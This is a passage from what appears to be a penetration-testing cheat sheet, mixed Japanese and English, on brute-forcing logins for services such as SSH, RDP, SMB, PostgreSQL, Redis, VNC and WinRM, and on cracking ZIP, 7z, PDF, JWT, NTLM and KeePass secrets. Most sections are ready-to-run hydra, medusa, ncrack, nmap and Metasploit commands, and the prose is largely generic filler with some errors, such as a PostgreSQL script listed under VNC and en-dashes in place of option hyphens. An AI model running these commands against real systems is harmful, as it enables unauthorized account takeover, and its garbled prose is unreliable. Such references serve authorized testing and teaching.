Brute force attacks can be time-consuming and resource-intensive, especially if the password being targeted is long and complex. However, with the help of powerful computers and specialized software, hackers can automate the process and significantly speed up the attack.

To protect against brute force attacks, it is important to use strong and unique passwords that are not easily guessable. Additionally, implementing account lockout policies, which temporarily lock an account after a certain number of failed login attempts, can also help mitigate the risk of brute force attacks.

It is worth noting that brute force attacks are illegal and unethical. Engaging in such activities without proper authorization is a criminal offense and can result in severe penalties.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQLはオープンソースのリレーショナルデータベース管理システムです。ブルートフォース攻撃は、PostgreSQLデータベースに対して非常に効果的な攻撃手法の1つです。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために、すべての可能な組み合わせを試行する方法です。

ブルートフォース攻撃は、通常、辞書攻撃と組み合わせて使用されます。辞書攻撃では、一般的なパスワードや単語のリストを使用して、推測を行います。ブルートフォース攻撃は、辞書攻撃が成功しなかった場合に使用され、すべての可能な組み合わせを試すことで、パスワードを特定します。

PostgreSQLのブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの長さと複雑さを要件として設定することが重要です。また、アカウントロックアウト機能を有効にすることも推奨されます。これにより、一定回数の認証試行が失敗した場合に、アカウントが一時的にロックされるようになります。

さらに、PostgreSQLのバージョンを最新に保つことも重要です。新しいバージョンには、セキュリティの脆弱性が修正されている場合があります。定期的なパッチ適用とアップグレードを行うことで、攻撃者が既知の脆弱性を悪用することを防ぐことができます。

最後に、PostgreSQLのアクセス制御リスト（ACL）を適切に設定することも重要です。必要な権限のみを付与し、不要な権限を削除することで、攻撃者の侵入を防ぐことができます。

以上が、PostgreSQLに対するブルートフォース攻撃の防御方法です。これらの対策を実施することで、データベースのセキュリティを強化することができます。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)から`.deb`パッケージをダウンロードしてインストールすることができます。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
## RDP

RDP (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft that allows users to remotely access and control a computer over a network. It is commonly used for remote administration and remote support purposes.

### Brute Force Attack on RDP

A brute force attack on RDP involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found. This is done by using automated tools that can rapidly attempt multiple login attempts.

#### Methodology

1. **Enumeration**: Gather information about the target RDP server, such as the IP address, port number, and available usernames.
2. **Password List**: Create or obtain a password list that contains commonly used passwords, leaked passwords, or passwords specific to the target organization.
3. **Brute Force Tool**: Use a brute force tool, such as Hydra or Medusa, to automate the login attempts using the obtained username list and password list.
4. **Configure Tool**: Set the tool to target the RDP protocol and specify the IP address and port number of the target RDP server.
5. **Launch Attack**: Start the brute force attack and let the tool systematically try all possible combinations of usernames and passwords.
6. **Monitor Progress**: Monitor the tool's progress and check for any successful login attempts.
7. **Post-Attack**: Once the attack is complete, analyze the results and report any successful login credentials.

#### Countermeasures

To protect against brute force attacks on RDP, consider implementing the following countermeasures:

- **Strong Passwords**: Enforce the use of strong, complex passwords that are resistant to brute force attacks.
- **Account Lockout Policy**: Implement an account lockout policy that locks out user accounts after a certain number of failed login attempts.
- **Network Segmentation**: Separate the RDP server from the rest of the network to limit the attack surface.
- **Two-Factor Authentication**: Implement two-factor authentication to add an extra layer of security to the RDP login process.
- **IP Whitelisting**: Restrict RDP access to specific IP addresses or ranges to limit unauthorized access.
- **Monitoring and Alerting**: Implement monitoring and alerting systems to detect and respond to brute force attacks in real-time.

By following these countermeasures, you can significantly reduce the risk of a successful brute force attack on RDP.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
# Redis

Redis（Remote Dictionary Server）は、高速でオープンソースのキーバリューストアです。Redisは、メモリ内でデータを保持するため、高速な読み書きアクセスが可能です。また、データの永続化もサポートしています。

## ブルートフォース攻撃

ブルートフォース攻撃は、暗号化されたデータやパスワードを解読するために使用される攻撃手法です。この攻撃手法では、すべての可能な組み合わせを試行し、正しい組み合わせを見つけるまで続けます。

Redisに対するブルートフォース攻撃では、一連のパスワードを試行し、正しいパスワードを見つけることを目指します。攻撃者は、一般的なパスワードや辞書攻撃を使用して、パスワードを推測します。

ブルートフォース攻撃は、強力なパスワードポリシーが実装されていない場合や、弱いパスワードが使用されている場合に特に効果的です。攻撃者は、パスワードの推測に時間がかかる場合でも、自動化されたツールを使用して攻撃を行うことができます。

## ブルートフォース攻撃の防止策

ブルートフォース攻撃からRedisを保護するためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実装する：長いパスワード、大文字と小文字の組み合わせ、数字や特殊文字の使用など、セキュアなパスワードポリシーを設定します。
- ログイン試行回数の制限：一定回数のログイン試行が失敗した場合、アカウントへのアクセスを一時的にブロックするなど、ログイン試行回数の制限を設けます。
- CAPTCHAの使用：CAPTCHA（Completely Automated Public Turing test to tell Computers and Humans Apart）を使用して、自動化されたブルートフォース攻撃を防止します。
- IPアドレスの制限：特定のIPアドレスからのアクセスを制限することで、不正なアクセスを防止します。
- ログの監視：ログを監視し、異常なアクティビティを検出することで、ブルートフォース攻撃を早期に検知します。

これらの対策を組み合わせることで、Redisへのブルートフォース攻撃からの保護を強化することができます。
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec is a remote execution service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing multiple servers or performing system maintenance tasks.

One common method of brute-forcing Rexec is by attempting to guess the username and password combination. This can be done by using a list of commonly used usernames and passwords, or by generating a list of possible combinations based on known information about the target system.

Another approach is to use a tool like Hydra, which is specifically designed for brute-forcing various protocols, including Rexec. Hydra allows you to specify a list of usernames and passwords, and it will automatically try each combination until it finds a successful login.

It is important to note that brute-forcing Rexec or any other service is generally considered unethical and illegal without proper authorization. It is recommended to only use these techniques in a controlled environment, such as during a penetration testing engagement, with the explicit permission of the target system owner.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is a remote login protocol that allows users to log into a remote system over a network. It is commonly used in Unix-based systems. 

Brute forcing Rlogin involves systematically trying different username and password combinations until the correct credentials are found. This can be done using automated tools or scripts that iterate through a list of common usernames and passwords. 

It is important to note that brute forcing is an aggressive and potentially illegal hacking technique. It is recommended to only use this technique with proper authorization and for legitimate purposes, such as penetration testing.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. However, it is important to note that Rsh is considered insecure due to its lack of encryption and authentication mechanisms.

One common attack method against Rsh is brute force. Brute force involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found. This can be done using automated tools or scripts that iterate through a list of commonly used usernames and passwords.

To protect against brute force attacks on Rsh, it is recommended to disable or restrict access to the Rsh service. Additionally, strong and unique passwords should be used to minimize the risk of successful brute force attacks.

It is worth mentioning that Rsh is an outdated protocol and has been largely replaced by more secure alternatives such as SSH (Secure Shell). SSH provides encryption and authentication, making it a much safer choice for remote administration tasks.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsyncは、ファイル転送と同期のための強力なツールです。このツールは、ローカルマシンとリモートマシン間でファイルを転送するために使用されます。Rsyncは、ファイルの差分を計算し、変更された部分のみを転送することができます。これにより、転送時間と帯域幅を節約することができます。

Rsyncは、SSHプロトコルを使用してファイルを転送するため、データのセキュリティも確保されます。また、転送中に途中でエラーが発生した場合でも、再開することができます。

Rsyncは、LinuxやUnixシステムで広く使用されており、非常に柔軟なオプションを提供しています。ファイルの転送や同期に関するさまざまなニーズに対応するため、多くのコマンドラインオプションが用意されています。

Rsyncは、ブルートフォース攻撃には使用されませんが、ファイル転送や同期のための重要なツールとして知られています。
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP（Real Time Streaming Protocol）は、ストリーミングメディアを配信するためのプロトコルです。RTSPは、クライアントとサーバー間でメディアの制御情報をやり取りするために使用されます。RTSPは、リアルタイムのビデオやオーディオのストリームを効率的に転送するために設計されています。

RTSPの攻撃には、ブルートフォース攻撃が使用されることがあります。ブルートフォース攻撃は、辞書やランダムなパスワードの組み合わせを試し、正しいパスワードを見つけることを試みます。攻撃者は、RTSPサーバーに対して大量のパスワードを試すことで、不正アクセスを試みることができます。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを確保する必要があります。また、アカウントロックアウト機能を有効にすることも重要です。これにより、一定回数の誤ったパスワード試行後にアカウントがロックされるため、攻撃者のブルートフォース攻撃を防ぐことができます。

さらに、RTSPサーバーへのアクセスを制限するために、ファイアウォールやIP制限などのセキュリティ対策を実施することも推奨されます。これにより、不正なアクセスを試みる攻撃者のIPアドレスをブロックすることができます。

RTSPサーバーのセキュリティを確保するためには、定期的な脆弱性評価やペネトレーションテストを実施することも重要です。これにより、潜在的な脆弱性を特定し、適切な対策を講じることができます。
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP（Simple Network Management Protocol）は、ネットワークデバイスの管理と監視に使用されるプロトコルです。SNMPは、ネットワーク上のデバイスの情報を収集し、設定を変更するために使用されます。SNMPは、エージェントとマネージャの間で情報をやり取りするために使用されます。

SNMPは、デバイスの情報を取得するために、ブルートフォース攻撃に使用されることがあります。ブルートフォース攻撃では、辞書やパスワードリストを使用して、デバイスのコミュニティストリング（SNMPの認証情報）を推測しようとします。推測に成功すれば、攻撃者はデバイスにアクセスし、情報を取得したり、設定を変更したりすることができます。

ブルートフォース攻撃は、効果的な攻撃手法の1つですが、デバイスが強力なパスワードポリシーを使用している場合や、攻撃者が十分な時間とリソースを持っていない場合には成功しづらいです。したがって、セキュリティを強化するためには、強力なパスワードポリシーの使用や、SNMPのセキュリティ設定の適切な構成が重要です。
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB（Server Message Block）は、ネットワーク上でファイル共有やリソース共有を行うためのプロトコルです。SMBは、Windowsオペレーティングシステムで広く使用されており、ファイルやプリンターなどのリソースをネットワーク上で共有するための機能を提供します。

SMBのブルートフォース攻撃は、辞書攻撃の一種であり、ユーザー名とパスワードの組み合わせを総当たりで試行し、正しい認証情報を見つけることを目指します。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

ブルートフォース攻撃は、自動化ツールを使用して実行することができます。これにより、大量のユーザー名とパスワードの組み合わせを高速で試行することができます。攻撃者は、一般的なパスワードや辞書攻撃によって成功する可能性が高いパスワードを使用しているユーザーアカウントを特定することができます。

SMBのブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実施し、パスワードの複雑さを強化する必要があります。また、アカウントロックアウトポリシーを設定することで、一定回数の認証失敗後にアカウントをロックすることも有効です。さらに、マルウェアや不正アクセスを検知するためのセキュリティソリューションの導入も重要です。
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
SMTP（Simple Mail Transfer Protocol）は、電子メールの送信に使用されるプロトコルです。SMTPサーバーに接続し、メールを送信するために必要な情報を提供します。SMTPは、メールアドレスの確認やメールの送信制限などのセキュリティ機能を提供します。SMTPサーバーへのアクセスを悪用することで、スパムメールの送信や不正なアクティビティを行うことができます。Brute force攻撃は、SMTPサーバーへのアクセスを試行する際に使用される一般的な手法の1つです。Brute force攻撃では、辞書攻撃やランダムなパスワードの試行など、さまざまな方法でパスワードを推測し、正しいパスワードを見つけることを試みます。Brute force攻撃は、パスワードが弱い場合やセキュリティ対策が不十分な場合に特に効果的です。
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
SOCKSは、ネットワークプロトコルであり、プロキシサーバーを介してTCP/IP接続を確立するために使用されます。 SOCKSプロトコルは、クライアントとサーバーの間でデータを中継するために使用されます。 SOCKSプロキシは、ユーザーのIPアドレスを隠すために使用されることがあります。 SOCKSプロキシを使用すると、ユーザーは自分のIPアドレスを隠すことができ、ウェブサイトやアプリケーションに匿名でアクセスすることができます。

SOCKSプロキシをハッキングに使用する場合、ブルートフォース攻撃は一般的な手法です。ブルートフォース攻撃では、ハッカーはすべての可能なパスワードの組み合わせを試し、正しいパスワードを見つけることを試みます。これにより、ハッカーはシステムに不正アクセスすることができます。

ブルートフォース攻撃を実行するためには、ハッカーは通常、辞書攻撃やランダムなパスワード生成などの手法を使用します。辞書攻撃では、ハッカーは一連の一般的なパスワードを試し、ランダムなパスワード生成では、ハッカーはランダムな文字列の組み合わせを試します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、十分な計算リソースと時間があれば、ハッカーは成功する可能性があります。したがって、セキュリティを強化するためには、強力なパスワードポリシーを実装し、ブルートフォース攻撃を防ぐための対策を講じることが重要です。
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH（Secure Shell）は、ネットワーク上で安全なリモートアクセスを提供するプロトコルです。SSHを使用すると、暗号化されたトンネルを介してリモートサーバーに接続し、コマンドを実行したりファイルを転送したりすることができます。

SSHのブルートフォース攻撃は、辞書攻撃とも呼ばれ、SSHサーバーへの不正アクセスを試みる手法です。攻撃者は、一連のパスワードを試し、正しいパスワードを見つけることを目指します。

SSHブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施する：長さ、複雑さ、一意性の要件を設定し、定期的なパスワード変更を促す。
- ログイン試行回数の制限：一定の時間内に許可されるログイン試行回数を制限する。
- パスワード認証の無効化：公開鍵認証を使用してSSH接続を設定し、パスワード認証を無効にする。
- ネットワークレベルのセキュリティ：SSHサーバーへのアクセスを制限するために、ファイアウォールやネットワークセグメンテーションを使用する。

SSHブルートフォース攻撃は、セキュリティ上の脅威となる可能性があるため、適切な対策を講じることが重要です。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### 弱いSSHキー/Debianの予測可能なPRNG
一部のシステムでは、暗号化素材を生成するために使用されるランダムシードに既知の欠陥があります。これにより、キースペースが劇的に減少し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)などのツールでブルートフォース攻撃が可能になります。また、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)などの弱いキーの事前生成セットも利用可能です。

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnetは、ネットワーク上のリモートコンピュータに接続するためのプロトコルです。このプロトコルを使用すると、リモートコンピュータにログインし、コマンドを実行することができます。Telnetは、ユーザー名とパスワードを使用して認証するため、セキュリティ上のリスクがあります。そのため、Telnetを使用する際には注意が必要です。

Telnetの攻撃手法の一つは、ブルートフォース攻撃です。ブルートフォース攻撃では、すべての可能なパスワードの組み合わせを試し、正しいパスワードを見つけることを試みます。これにより、不正アクセスを試みる攻撃者が正しいパスワードを推測することができる可能性があります。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実施し、パスワードの長さと複雑さを増やすことが重要です。また、アカウントロックアウト機能を有効にすることで、一定回数の誤ったパスワード入力後にアカウントをロックすることも有効です。

Telnetの代替手段として、よりセキュアなSSH（Secure Shell）プロトコルを使用することをおすすめします。SSHは、暗号化された通信を提供し、セキュリティ上のリスクを軽減することができます。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC（Virtual Network Computing）は、リモートデスクトッププロトコル（RDP）の一種であり、リモートマシンへのアクセスを提供するために使用されます。VNCは、クライアントとサーバーの間でデスクトップ画面の情報を送受信することによって動作します。

VNCのブルートフォース攻撃は、パスワードの推測を行い、正しいパスワードを見つけることを目指します。この攻撃は、一般的なパスワードリストを使用して自動化されることが多く、多くの試行とエラーが行われます。

VNCのブルートフォース攻撃を実行するためには、ブルートフォースツールを使用する必要があります。一般的なツールには、Hydra、Medusa、Ncrackなどがあります。これらのツールは、複数の接続を同時に試行し、パスワードを推測するためのさまざまな方法を提供します。

VNCのブルートフォース攻撃は、セキュリティ上の脆弱性を悪用するため、合法的な目的でのみ使用することが重要です。また、攻撃を実行する前に、適切な許可を得る必要があります。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrmは、Windowsリモート管理（WinRM）プロトコルを使用して、リモートでWindowsマシンを管理するためのサービスです。WinRMは、Windows PowerShellや他のリモート管理ツールを使用して、リモートマシンにコマンドを実行したり、設定を変更したりするために使用されます。

Winrmは、デフォルトで有効になっている場合がありますが、一部のセキュリティ設定によって無効にされている場合もあります。Winrmを使用してリモートマシンにアクセスするためには、Winrmサービスが実行されていることを確認し、必要に応じて設定を変更する必要があります。

Winrmを使用してリモートマシンにアクセスするための一般的な手法の1つは、ブルートフォース攻撃です。ブルートフォース攻撃では、辞書やパスワードリストを使用して、可能なすべてのパスワードの組み合わせを試行し、正しいパスワードを見つけることを試みます。

ブルートフォース攻撃は、パスワードが弱い場合や、パスワードポリシーが緩い場合に特に効果的です。しかし、ブルートフォース攻撃は時間がかかる場合があり、大量のリクエストを送信するため、検出される可能性があります。

ブルートフォース攻撃を実行するためには、ブルートフォースツールを使用する必要があります。一般的なブルートフォースツールには、Hydra、Medusa、Ncrackなどがあります。これらのツールは、多くのプロトコルやサービスに対応しており、パスワードの試行を自動化するための機能を提供しています。

ブルートフォース攻撃を実行する際には、以下のポイントに注意する必要があります。

- パスワードリストを適切に選択し、一般的なパスワードや弱いパスワードを含めることが重要です。
- ブルートフォース攻撃は時間がかかる場合があるため、十分な時間を確保する必要があります。
- 大量のリクエストを送信するため、攻撃が検出される可能性があるため、適切な対策を講じる必要があります。

ブルートフォース攻撃は、セキュリティテストやペネトレーションテストの一環として使用されることがありますが、許可なく他人のシステムに対して実行することは違法です。適切な許可を得て、法的な範囲内でのみブルートフォース攻撃を実行してください。
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフロー**を簡単に構築し、自動化することができます。\
今すぐアクセスを取得してください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ローカル

### オンラインクラッキングデータベース

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (ハッシュ、WPA2キャプチャ、およびMSOffice、ZIP、PDFのアーカイブ)
* [https://crackstation.net/](https://crackstation.net) (ハッシュ)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (ハッシュおよびファイルハッシュ)
* [https://hashes.org/search.php](https://hashes.org/search.php) (ハッシュ)
* [https://www.cmd5.org/](https://www.cmd5.org) (ハッシュ)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

ハッシュをブルートフォースする前に、これをチェックしてください。

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 既知の平文zip攻撃

暗号化されたzip内のファイルの**平文**（または平文の一部）を知る必要があります。暗号化されたzip内のファイルの**ファイル名とサイズを確認**するには、**`7z l encrypted.zip`**を実行します。\
[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をリリースページからダウンロードしてください。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7zは、高い圧縮率を持つオープンソースのファイルアーカイバです。7zファイルは、他のファイルアーカイブ形式よりも小さくなる傾向があります。この形式は、7-Zipソフトウェアによって作成および解凍することができます。

7zファイルのパスワードを解読するために、ブルートフォース攻撃を使用することができます。ブルートフォース攻撃は、すべての可能なパスワードの組み合わせを試すことで、正しいパスワードを見つける手法です。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、パスワードが弱い場合や短い場合には効果的です。ただし、強力なパスワードを使用している場合や、パスワードがランダムな場合には、ブルートフォース攻撃は非現実的な方法となる可能性があります。

7zファイルのブルートフォース攻撃を実行するためには、専用のツールやスクリプトを使用することができます。これらのツールは、自動的にパスワードの組み合わせを生成し、7zファイルに対して試行します。ただし、ブルートフォース攻撃は合法的な目的でのみ使用することが重要です。
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
## ブルートフォース攻撃

ブルートフォース攻撃は、パスワードや認証情報を推測するために使用される一般的な攻撃手法です。この攻撃では、攻撃者は自動化されたツールを使用して、可能なすべての組み合わせを試し、正しいパスワードを見つけることを試みます。

ブルートフォース攻撃は、パスワードの弱さや予測可能性に依存しています。一般的な攻撃手法には、辞書攻撃、総当たり攻撃、ハイブリッド攻撃などがあります。

辞書攻撃は、事前に作成された辞書ファイルを使用してパスワードを推測します。この攻撃手法では、一般的なパスワードや一般的な単語の組み合わせが試されます。

総当たり攻撃は、すべての可能な組み合わせを順番に試す攻撃手法です。この攻撃手法は非常に時間がかかる場合がありますが、パスワードが予測可能な場合には効果的です。

ハイブリッド攻撃は、辞書攻撃と総当たり攻撃を組み合わせた攻撃手法です。まず、辞書攻撃を試し、その後、総当たり攻撃を使用して残りの組み合わせを試します。

ブルートフォース攻撃は非常に効果的ですが、時間がかかる場合があります。攻撃者は、クラウド/SaaSプラットフォームを使用して攻撃をスケーリングすることができます。ただし、ブルートフォース攻撃は合法的な目的でのみ使用されるべきです。
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDFオーナーパスワード

PDFオーナーパスワードをクラックするには、次を確認してください：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM クラッキング

NTLM クラッキングは、Windows ベースのシステムで使用される認証プロトコルである NTLM のパスワードを解読する手法です。NTLM ハッシュを取得するために、パスワードのハッシュを総当たり攻撃することが一般的です。

NTLM クラッキングには、以下の手法があります。

1. 辞書攻撃: 事前に作成されたパスワードリストを使用して、ユーザーのパスワードを総当たりで試行します。一般的なパスワードや一般的な単語の組み合わせを含むリストが使用されます。

2. ブルートフォース攻撃: パスワードの全ての組み合わせを試行する方法です。この手法は非常に時間がかかるため、効率的なハッシュアルゴリズムを使用して高速化することが重要です。

3. ハイブリッド攻撃: 辞書攻撃とブルートフォース攻撃を組み合わせた手法です。まず辞書攻撃を試みて、成功しなかった場合にブルートフォース攻撃に移行します。

NTLM クラッキングには、高性能なハードウェアやクラウドベースの計算リソースを利用することも可能です。これにより、クラッキングの速度を大幅に向上させることができます。

NTLM クラッキングは、パスワードの強度やハッシュアルゴリズムのセキュリティに依存します。より強力なパスワードポリシーやハッシュアルゴリズムを使用することで、NTLM クラッキングのリスクを軽減することができます。
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

Keepassは、パスワード管理ツールであり、個人や組織が複数のアカウントのパスワードを安全に管理するために使用されます。Keepassは、強力な暗号化アルゴリズムを使用してパスワードデータベースを保護し、マスターパスワードを使用してアクセスを制御します。

Keepassのブルートフォース攻撃は、暗号化されたパスワードデータベースのマスターパスワードを解読するために使用される攻撃手法です。ブルートフォース攻撃では、すべての可能な組み合わせのパスワードを試し、正しいパスワードを見つけるまで続けます。

ブルートフォース攻撃は、非常に時間がかかる場合があります。しかし、強力なパスワードを使用している場合や、パスワードの長さが十分に長い場合は、解読が困難になります。

Keepassのブルートフォース攻撃を防ぐためには、強力なマスターパスワードを使用し、定期的に変更することが重要です。また、パスワードデータベースをクラウドストレージに保存する場合は、セキュリティを強化するために二要素認証を有効にすることをお勧めします。

Keepassは、パスワード管理のための便利なツールですが、適切なセキュリティ対策を講じることが重要です。
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

